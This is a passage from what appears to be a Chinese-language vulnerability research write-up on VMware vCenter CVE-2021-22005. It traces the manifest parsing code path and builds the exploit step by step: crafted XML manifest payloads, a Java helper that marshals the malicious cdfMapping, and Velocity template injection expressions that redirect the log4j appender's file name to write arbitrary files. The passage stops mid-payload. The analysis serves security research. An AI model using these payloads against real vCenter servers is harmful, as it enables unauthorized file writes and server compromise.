class="hljs-params">obfuscationRules</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">RecommendedPageSize(<span class="hljs-params">recommendedPageSize</span>)</span>.build<span class="hljs-literal">()</span>;<br>                return result;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                return null;<br>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>a、构造<requestSchedules>标签</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> static Document get<span class="hljs-constructor">ManifestDocForSchedule(String <span class="hljs-params">manifestStr</span>, CollectionSchedule <span class="hljs-params">collectionSchedule</span>, <span class="hljs-params">boolean</span> <span class="hljs-params">isLegacySchedulingSupported</span>)</span> &#123;<br>        boolean containsRequestScheduleSection = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>contains<span class="hljs-constructor">RequestScheduleSection(<span class="hljs-params">manifestStr</span>)</span>;<br>        Document manifestDocument;<br>        <span class="hljs-keyword">if</span> (containsRequestScheduleSection) &#123;<span class="hljs-comment">//必须包含requestSchedules标签</span><br>            manifestDocument = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>get<span class="hljs-constructor">NonDailySection(<span class="hljs-params">manifestStr</span>)</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isLegacySchedulingSupported) &#123;<span class="hljs-comment">//默认false</span><br>            manifestDocument = get<span class="hljs-constructor">ManifestDocForLegacySchedule(<span class="hljs-params">manifestStr</span>, <span class="hljs-params">collectionSchedule</span>)</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            manifestDocument = null;<br>        &#125;<br>        return manifestDocument;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/31.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/32.png"></p><p><code>&lt;requestSchedules&gt;标签对应的类是：com.vmware.ph.phservice.collector.internal.manifest.xml.scheduling.data.RequestScheduleSpec</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/33.png"></p><p>构造完成<requestSchedules>标签:<code>&lt;requestSchedules&gt;&lt;/requestSchedules&gt;</code></p><p>b、构造<request>标签</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestParser<span class="hljs-selector-id">#parseQueries</span><br>com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestUtils#parseRequestSpec<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/34.png"></p><p>解析<request>标签的解析器：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.JaxbRequestSpecParser#parse</code>,限制了必须包含<code>&lt;constraint&gt;</code>标签</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/35.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/36.png"></p><p><request>标签对应的类是：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.RequestSpec</code></p><p>​                                                  <img src="/../../../../images/c3442871da035b4836c30ca52af6386b2b9a3944713588fd665b518b3c05dc94.png" alt="图 4">  </p><p>query标签对应的类是：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.QuerySpec</code></p><p>​                                                <img src="/../../../../images/1f99ba2290974305704d0bbc37151205aa6709083d2fc0056eb8ca64bf8bcf45.png" alt="图 5">  </p><p>constraint标签对应的类是：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.QuerySpec#QuerySpec()</code></p><p>​                                             <img src="/../../../../images/1287bb7f2b34501c61cd57cf762cb7fe7662ad01f965afb0da35a130aa0ce4ce.png" alt="图 6">  </p><p>构造<request>标签：<code>&lt;request&gt;&lt;query&gt;&lt;constraint&gt;&lt;targetType&gt;xxx&lt;/targetType&gt;&lt;/constraint&gt;&lt;/query&gt;&lt;/request&gt;</code></p><p>c、构造<cdfMapping>标签</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp">com.vmware.ph.phservice.collector.<span class="hljs-keyword">internal</span>.manifest.xml.XmlManifestUtils<span class="hljs-meta">#parseCdfMapping</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;I, O&gt; <span class="hljs-function">Mapping&lt;I, O&gt; <span class="hljs-title">parseCdfMapping</span>(<span class="hljs-params">Document manifestDoc, MappingParser mappingParser</span>)</span> &#123;<br><span class="hljs-keyword">return</span> parseMapping(manifestDoc, mappingParser, <span class="hljs-string">&quot;cdfMapping&quot;</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><cdfMapping>标签对应的解析器:<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.JaxbCdfMappingParser#parse</code></p><p>58行限制了<cdfMapping>的第一个节点对应类为：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.data.IndependentResultsMapping</code>,拿到IndependentResultsMapping对象后，调用其<code>build()</code>返回重新构造的<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.IndependentResultsMapping</code>对象</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/37.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/38.png"></p><p><code>&lt;indepedentResultsMapping&gt;</code>标签对应类：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.data.IndependentResultsMapping</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/39.png"></p><p>在build()时会根据属性值<code>resultSetMappings</code>重新构建<code>IndependentResultsMapping</code>对象.所以需要加上resultSetMappings属性值，这部分后面构造时会讲解</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">requestSchedules</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">requestSchedules</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">targetType</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">targetType</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">cdfMapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">indepedentResultsMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">indepedentResultsMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">cdfMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们接着往下看，解析器构建完Manifest对象后开始检查queries变量：<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.CollectionTriggerTypeManifestParser#getManifest</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/40.png"></p><p>com.vmware.ph.phservice.cloud.dataapp.iternal.collector.CollectionTriggerTypeManifestParser#filterOnDemandQueries</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/41.png"></p><p>限制<code>&lt;request&gt;</code>的子标签<code>&lt;query&gt;</code>必须包含name,调整为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">\</span>&quot;<span class="hljs-attr">aaa</span>\&quot;&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">targetType</span>&gt;</span>sss<span class="hljs-tag">&lt;/<span class="hljs-name">targetType</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">request</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-2-对manifestToExecute进行收集操作"><a href="#3-2-2-对manifestToExecute进行收集操作" class="headerlink" title="3.2.2 对manifestToExecute进行收集操作"></a>3.2.2 对manifestToExecute进行收集操作</h4><p>构建好<code>Manifest</code>对象之后就到了：<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collectAndSend()</code>的第二步操作</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/42.png"></p><p>跟入：<code>com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#collect-&gt;com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#collectAndUpload-&gt;com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#processStructuredDataCollectors</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/43.png"></p><p>这里的几步操作分别为：<code>收集payloads、创建迭代器、判断迭代器、依次访问迭代器</code>，在访问迭代器时触发map()是导致本次漏洞的主因。下面对这三部分依次讲解</p><h5 id="3-2-2-1-第一部分：收集payloads"><a href="#3-2-2-1-第一部分：收集payloads" class="headerlink" title="3.2.2.1 第一部分：收集payloads"></a>3.2.2.1 第一部分：收集payloads</h5><p>最终返回的是重写了iterator()的<code>FluentIterable</code>对象</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/44.png">相当于伪代码：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">fromIterable = <span class="hljs-keyword">this</span>.collectors<br><br>Function <span class="hljs-function"><span class="hljs-keyword">fun</span> = new Function<span class="hljs-type">&lt;CdfCollector, Iterable&lt;CollectedPayload&gt;</span>&gt;<span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">public</span> Iterable&lt;CollectedPayload&gt; apply(CdfCollector input) &#123;<br>        long startTimeNano = System.nanoTime();<br>        xxx<br>    &#125;<br>&#125;));<br><br>FluentIterable fl = new FluentIterable&lt;T&gt;() &#123;<br>    <span class="hljs-keyword">public</span> Iterator&lt;T&gt; iterator() &#123;<br>        <span class="hljs-keyword">return</span> Iterators.transform(fromIterable.iterator(), <span class="hljs-function"><span class="hljs-keyword">fun</span>);</span><br>        &#125;<br>    &#125;;<br>&#125;<br><br>FluentIterable f2 = new FluentIterable&lt;T&gt;() &#123;<br>    <span class="hljs-keyword">public</span> Iterator&lt;T&gt; iterator() &#123;<br>    <span class="hljs-keyword">return</span> Iterators.concat(Iterables.iterators(fl));<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">return</span> f2<br></code></pre></td></tr></table></figure><h5 id="3-2-2-2-第二部分：创建迭代器"><a href="#3-2-2-2-第二部分：创建迭代器" class="headerlink" title="3.2.2.2 第二部分：创建迭代器"></a>3.2.2.2 第二部分：创建迭代器</h5><p>开始调用:<code>collectedPayloads.iterator()</code>,即<code>f2.iterator()</code>,调用链：<code>f2.iterator()-&gt;f1.iterator()-&gt;Iterators.transform()-&gt;Iterators.concat()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/45.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/46.png"></p><p>最终<code>concat()</code>返回了实现hasNext()、next()、remove()的Iterator对象，input是<code>TransformedIterator</code>对象,相当于（伪代码）：</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nim">fromIterator = this.collectors.<span class="hljs-keyword">iterator</span>();<br><br><span class="hljs-type">TransformedIterator</span> transformedIterator1 = new <span class="hljs-type">TransformedIterator</span>&lt;F, T&gt;(fromIterator) &#123;<br>    T transform(F <span class="hljs-keyword">from</span>) &#123;<br>    <span class="hljs-keyword">return</span> fun.apply(<span class="hljs-keyword">from</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">TransformedIterator</span> transformedIterator2 = new <span class="hljs-type">TransformedIterator</span>&lt;<span class="hljs-type">Iterable</span>&lt;? extends T&gt;, <span class="hljs-type">Iterator</span>&lt;? extends T&gt;&gt;(transformedIterator1) &#123;<br>    <span class="hljs-type">Iterator</span>&lt;? extends T&gt; transform(<span class="hljs-type">Iterable</span>&lt;? extends T&gt; <span class="hljs-keyword">from</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">from</span>.<span class="hljs-keyword">iterator</span>();<br>    &#125;<br>&#125;;<br><br><br><span class="hljs-type">Iterator</span> iterator1 = new <span class="hljs-type">Iterator</span>&lt;T&gt;() &#123;<br>inputs = transformedIterator2;<br>    public boolean hasNext() <span class="hljs-meta">&#123;...&#125;</span><br>    public T next() <span class="hljs-meta">&#123;...&#125;</span><br>    public <span class="hljs-type">void</span> remove() <span class="hljs-meta">&#123;...&#125;</span><br>&#125;;<br><br><br><span class="hljs-keyword">return</span> iterator1;<br></code></pre></td></tr></table></figure><h5 id="3-2-2-2-第三部分：判断迭代器"><a href="#3-2-2-2-第三部分：判断迭代器" class="headerlink" title="3.2.2.2 第三部分：判断迭代器"></a>3.2.2.2 第三部分：判断迭代器</h5><p>接着开始调用<code>collectedPayloadsIterator.hasNext()</code>即<code>iterator1.hasNext()</code>判断是否next()存在值，<code>inputs.hasNext()-&gt;transformedIterator2.hasNext()-&gt;transformedIterator1#hasNext()-&gt;this.collectors.iterator().hasNext()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/47.png"></p><p>判断存在后，调用inputs.next()进行赋值：<code>inputs.next()-&gt;transformedIterator2.next()-&gt;transformedIterator1#next()-&gt;this.collectors.iterator().next()-&gt;transformedIterator1.transform()-&gt;fun.apply()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/48.png"></p><p>调用到<code>input.collect(manifest, queryService, context, pageSize);</code>,将我们传入的<code>&lt;query&gt;</code>与<code>&lt;cdfMapping&gt;</code>赋值给queries、payloadMappin</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/49.png"></p><p>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector#collect</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/50.png"></p><p><code>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector#filterQueriesForExecution</code>限制了IndependentResultsMapping#_queryNameToResultSetMapping的entry要包含<query>的name值即：<code>&lt;query name=&quot;aaa&quot;&gt;    &lt;cdfMapping&gt;&lt;indepedentResultsMapping&gt;&lt;resultSetMappings&gt;&lt;entry&gt;&lt;key&gt;aaa&lt;/key&gt;&lt;/entry&gt;&lt;/resultSetMappings&gt;&lt;/indepedentResultsMapping&gt;</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/51.png"></p><p>添加query之后返回实现了iterator()的Iterable对象，继续往下执行到<code>Iterables.transform(result, obfuscationFunction);</code>，返回实现了iterator()的FluentIterable类对象</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/52.png"></p><p>接着执行到<code>Iterables.concat(result, perfData);</code>，返回实现了iterator()的FluentIterable类对象</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/53.png"></p><p>​                                         &#x2F;<img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/54.png"></p><p>相当于伪代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Iterable iterable2 = <span class="hljs-keyword">new</span> Iterable&lt;OUT&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;OUT&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">QueryServiceCollector</span>.</span></span>this.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_resultIteratorFactory</span>.</span></span>get<span class="hljs-constructor">Iterator(<span class="hljs-params">queryService</span>, <span class="hljs-params">responseMapping</span>, <span class="hljs-params">modifiedContext</span>, <span class="hljs-params">queriesForExecution</span>, <span class="hljs-params">pageSize</span>)</span>;<br>    &#125;<br>&#125;);<br><br><br>FluentIterable f3 = <span class="hljs-keyword">new</span> FluentIterable&lt;T&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;T&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterators</span>.</span></span>transform(iterable2.iterator<span class="hljs-literal">()</span>, <span class="hljs-keyword">new</span> QueryServiceCdfCollector.<span class="hljs-constructor">ObfuscationFunction(<span class="hljs-params">this</span>.<span class="hljs-params">_obfuscator</span>, <span class="hljs-params">obfuscationRules</span>)</span>);<br>    &#125;<br>&#125;;<br><br>FluentIterable f4 = <span class="hljs-keyword">new</span> FluentIterable&lt;T&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;T&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterators</span>.</span></span>concat(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterables</span>.</span></span>iterators(inputs));<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>调用完内层的transformedIterator1后开始调用transformedIterator2.transform()</p><p><code>transformedIterator2.transform()-&gt;from.iterator()-&gt;f4.iterator()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/55.png"></p><p>调用到上面定义的iterator()，返回<code>responseMappingIterable.iterator()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/56.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/57.png"></p><h5 id="3-2-2-4-第四部分：访问迭代器"><a href="#3-2-2-4-第四部分：访问迭代器" class="headerlink" title="3.2.2.4 第四部分：访问迭代器"></a>3.2.2.4 第四部分：访问迭代器</h5><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/58.png"></p><p>com.vmware.cis.data.internal.provider.ProviderRepository#getProviderForModel  判断<code>&lt;targetType&gt;</code>标签内容必须存在于_providerByModel中,原始exp采用的是“ServiceInstance”</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/59.png"></p><p>接着调用<code>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector.ResultIteratorFactory#getIterator</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/60.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/61.png"></p><p>开始调用传入标签的map()</p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.IndependentResultsMapping#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/62.png"></p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResultSetToCdfPayloadMapping#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/63.png"></p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.SafeMappingWrapper#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/64.png"></p><p>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/65.png"></p><p>作者找到了com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map()中存在Velocity模板注入</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/66.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/67.png"></p><p>接着我们使用代码生成<cdfMapping>标签的内容：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args)throws <span class="hljs-keyword">Exception</span> &#123;<br>        <span class="hljs-built_in">new</span> Test().testMarshalIndependMapping();<br>    &#125;<br>    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> testMarshalIndependMapping() throws <span class="hljs-keyword">Exception</span> &#123;<br>        ResourceItemToJsonLdMapping resourceItemToJsonLdMapping = <span class="hljs-built_in">new</span> ResourceItemToJsonLdMapping(&quot;a&quot;, &quot;b&quot;);<br>        List&lt;MappingBuilder&lt;NamedPropertiesResourceItem, ? extends CdfAble&gt;&gt; itemMappings = <span class="hljs-built_in">new</span> ArrayList();<br>        itemMappings.<span class="hljs-keyword">add</span>(resourceItemToJsonLdMapping);<br>        ResultSetToCdfPayloadMapping resultSetToCdfPayloadMapping = <span class="hljs-built_in">new</span> ResultSetToCdfPayloadMapping(itemMappings, <span class="hljs-built_in">new</span> VelocityResourceMapping());<br>        Map&lt;String, Mappings.<span class="hljs-keyword">Wrapper</span>&lt;ResultSetToCdfPayloadMapping&gt;&gt; resultSetMappings = <span class="hljs-built_in">new</span> HashMap();<br>        <span class="hljs-keyword">Wrapper</span> <span class="hljs-keyword">wrapper</span> = <span class="hljs-built_in">new</span> <span class="hljs-keyword">Wrapper</span>(resultSetToCdfPayloadMapping);<br>        resultSetMappings.put(&quot;keykey&quot;,<span class="hljs-keyword">wrapper</span>);<br>        IndependentResultsMapping independentResultsMapping = <span class="hljs-built_in">new</span> IndependentResultsMapping(resultSetMappings);<br>        marshal(independentResultsMapping);<br>    &#125;<br><br>    private <span class="hljs-type">void</span> marshal(<span class="hljs-keyword">Object</span> o) throws <span class="hljs-keyword">Exception</span> &#123;<br>        JAXBContext jaxbContext = JAXBContext.newInstance(ResourceItemToJsonLdMapping.<span class="hljs-keyword">class</span>,IndependentResultsMapping.<span class="hljs-keyword">class</span>, ResultSetToCdfPayloadMapping.<span class="hljs-keyword">class</span>);<br>        Marshaller marshaller = jaxbContext.createMarshaller();<br>        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, <span class="hljs-keyword">true</span>);<br>        marshaller.marshal(o, <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/68.png"></p><p>接着我们就可以到达触发模板注入的地方了</p><h3 id="3-3-Velocity模板注入"><a href="#3-3-Velocity模板注入" class="headerlink" title="3.3 Velocity模板注入"></a>3.3 Velocity模板注入</h3><blockquote><p>这部分内容是当时复现1day时的一些截图，所以只关注<mappingCode>标签内容即可</p></blockquote><p>调用链：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/69.png"></p><p>当传递aaa 字符串时，断到<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map</code><br><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/70.png">  </p><p>在<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.velocity.VelocityHelper#static()</code>装载了context变量的值：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/71.png"></p><p>经过调试发现这里的velocity  context并不包含常见的$request、$session变量，可用变量共26个，其中大部分是string信息，最初看到testbnull师傅截图，是通过修改这个”GLOBAL-logger”下属性值_fileName达到写文件目的。开始分析下</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/72.png">  </p><p>然后开始调试：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">velocityEngine.evaluate(substitutor, dummySw, logTag, &quot;<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>.<span class="hljs-variable">aai</span>)</span></span>##&quot;);<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/73.png">  </p><p>发现直接通过.拿不到aai这个变量，查看parent对应类<code>org.apache.log4j.spi.RootLogger</code>及其父类<code>org.apache.log4j.Logger</code>不存在该变量，在其爷爷类<code>org.apache.log4j.Category</code>找见了aai变量</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/74.png">  </p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/75.png">  </p><p>既然直接通过属性拿不到、也不能调用superClass等方法。在<code>org.apache.log4j.Category</code>类搜索aai的调用，发现<code>getAppender()</code>方法可以通过其属性<code>_delegate.name</code>直接拿到<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender</code>对象,都省下用aai去寻找属性了</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/76.png">  </p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/77.png">  </p><p>而这里的<code>_delegate.name</code>为<code>LOGFILE</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/78.png">  </p><p>现在已经拿到NonAppendingRollingFileAppender对象,再调用属性<code>_fileName</code>的<code>setter</code>方法即可修改</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/79.png">  </p><p>构造语句测试：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs leaf"><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>)</span></span>##<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">narfazj</span> = $<span class="hljs-variable">log</span>.<span class="hljs-variable">getAppender</span>(\<span 